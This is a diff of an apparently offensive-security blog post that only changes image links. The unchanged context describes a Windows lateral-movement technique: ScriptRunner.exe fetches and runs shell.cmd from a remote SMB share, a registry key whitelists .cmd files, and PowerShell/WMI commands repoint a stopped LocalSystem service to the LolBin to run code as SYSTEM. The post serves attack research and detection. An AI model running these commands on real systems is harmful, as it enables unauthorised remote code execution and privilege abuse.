@@ -42,7 +42,7 @@ Trigger the `Scriptrunner.exe`
 PS C:\Windows\system32> ScriptRunner.exe -appvscript  \\192.168.122.126\share\shell.cmd
 ```
 
-![](../assets/images/scriptrunner.png)
+![](/assets/images/scriptrunner.png)
 
 And I got an error: 
 "Error: You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network"
@@ -51,26 +51,26 @@ So i did further research online and I found out the problem is occurred because
 
 Now try to trigger the LolBin again: 
 
-![](../assets/images/open-file-security-warning.png)
+![](/assets/images/open-file-security-warning.png)
 
 and this popup stops the execution.
  
 So I found a thread in [superuser.com](https://superuser.com/questions/1863693/how-to-get-rid-of-open-file-security-warning-in-windows-11) and it says we  can white list file extensions and mark it as LowRiskFiles by creating a registry key `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Associations` with valueName: `LowRiskFileTypes` and ValueData: `.cmd`
 
 And by triggering the LolBin for the third time it works and it fetched the file and executed it!
-![](../assets/images/smb-connection.png)
-![](../assets/images/POC%20command%20executed.png)
+![](/assets/images/smb-connection.png)
+![](/assets/images/POC%20command%20executed.png)
 
 So now lets search for a stopped service with WMI and change the PathName to the LolBin and start it 
 
 First thing is to search for a service with `State = 'Stopped'` 
-![](../assets/images/List-Stopped-services.png)
+![](/assets/images/List-Stopped-services.png)
 
 And lets select the first service and Change the path name: 
 ```powerhsell
 $TargetService = Get-CimInstance -ClassName Win32_Service -Filter "State='Stopped'" -Property *| Select-Object -First 1
 ```
-![](../assets/images/Stopped-ServiceLocalService.png)
+![](/assets/images/Stopped-ServiceLocalService.png)
 As we can see the starter is `NT AUTHORITY\LocalService`
 and based on [MSDN](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts#local-service) It says: " It has minimum privileges on the local computer and presents anonymous credentials on the network." and this means we can access the smb share without changing the first registry that I mentioned and I have changed the Value of `AllowInsecureGuestAuth` back to 0 and changed the pathName to 
 
@@ -84,7 +84,7 @@ And then started the service:
 ```powershell
 Invoke-CimMethod -InputObject $TargetService -MethodName StartService
 ```
-![](../assets/images/Second%20SMB%20connection%20as%20LocalService.png)
+![](/assets/images/Second%20SMB%20connection%20as%20LocalService.png)
 
 And we got an smb connection with a null session but there is no command executed in the windows machine so after some thinking I remembered that I whitelisted the `.cmd` extension in `HKLM` so what if we searched for a service that runs under `NT AUTHORITY\SYSTEM` and I found that if the StarterName is `LocalSystem` it means it has `NT AUTHORITY\SYSTEM` token [localSystem Account](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account) 
 
@@ -93,7 +93,7 @@ So lets change our conditions so that we search for a service that is in a stopp
 ```powershell
 $TargetService = Get-CimInstance -ClassName Win32_Service -Filter "State='Stopped' AND StartName ='LocalSystem'" | Select-Object -First 1
 ```
-![](../assets/images/Local%20System%20service.png)
+![](/assets/images/Local%20System%20service.png)
 
 And let's change the path and start it: 
 ```powershell
@@ -103,7 +103,7 @@ Invoke-CimMethod -InputObject $TargetService -MethodName Change -Arguments @{
 	
 Invoke-CimMethod -InputObject $TargetService -MethodName StartService
 ```
-![](../assets/images/Worked.png)
+![](/assets/images/Worked.png)
 
 As we can see that it works on `LocalSystem` service!
 
@@ -250,7 +250,7 @@ self.serv.ChangePathName(service.PathName)
 ```
 
 I have published the script on GitHub: [StealthyWMIExec.py](https://github.com/Ghaleb0x317374/StealthyWMIExec.py)
-![](../assets/images/StealthyWMIExec.png)
+![](/assets/images/StealthyWMIExec.png)
 
 ## new approach for lateral movement with impacket ?
 With this idea, we can rewrite it using RPCs not just WMI. The main concept is to avoid touching the disk at all when using an `*exec.py` tools like `smbexec.py` or `wmiexec.py`.
